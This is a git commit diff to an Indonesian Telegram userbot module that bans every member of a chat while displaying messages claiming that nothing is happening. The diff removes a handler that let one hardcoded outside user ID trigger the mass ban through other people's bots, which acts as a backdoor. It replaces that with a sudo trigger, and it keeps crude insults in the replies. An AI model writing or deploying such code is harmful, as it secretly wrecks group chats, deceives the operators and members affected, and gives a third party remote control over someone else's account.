b08dda58da7818caa193e89dca97bc092cd6eee1
MERDHANI <80225366+ramadhani892@users.noreply.github.com>
2022-04-07 03:40:41 +0700

    Update cukup.py

--- userbot/modules/cukup.py
+++ userbot/modules/cukup.py
@@ -4,22 +4,25 @@ from telethon.tl.functions.channels import EditBannedRequest
 from userbot.events import register
 from userbot import CMD_HELP
 from userbot import CMD_HANDLER as cmd
-from userbot.utils import ram_cmd
+from userbot.utils import ram_cmd as tod, edit_or_reply as babi
+
 # Aku nambah kredit sdikit
 # rama ganteng bgt kan?
 # Port By @VckyouuBitch From GeezProject
 # Perkontolan Dengan Hapus Credits
+
+
 @ram_cmd(pattern="allout$")
-@register(incoming=True, from_users=1826643972, pattern=r"^\.callout$")
+@register(pattern="^\.callout$", sudo=True)
 async def testing(event):
     nikal = await event.get_chat()
     chutiya = await event.client.get_me()
     admin = nikal.admin_rights
     creator = nikal.creator
     if not admin and not creator:
-        await event.edit("Lu bukan admin, NGENTOOOOTTTTTT!!")
+        await babi(event, "Lu bukan admin, NGENTOOOOTTTTTT!!")
         return
-    await event.edit("Tidak Melakukan Apa-apa")
+    await babi(event, "Tidak Melakukan Apa-apa")
 # Thank for Dark_Cobra
     everyone = await event.client.get_participants(event.chat_id)
     for user in everyone:
@@ -28,9 +31,9 @@ async def testing(event):
         try:
             await event.client(EditBannedRequest(event.chat_id, int(user.id), ChatBannedRights(until_date=None, view_messages=True)))
         except Exception as e:
-            await event.edit(str(e))
+            await babi(event, str(e))
         await sleep(.5)
-    await event.edit("Tidak Ada yang Terjadi di sini🙃🙂")
+    await babi(event, "Tidak Ada yang Terjadi di sini🙃🙂")
 
 CMD_HELP.update(
     {
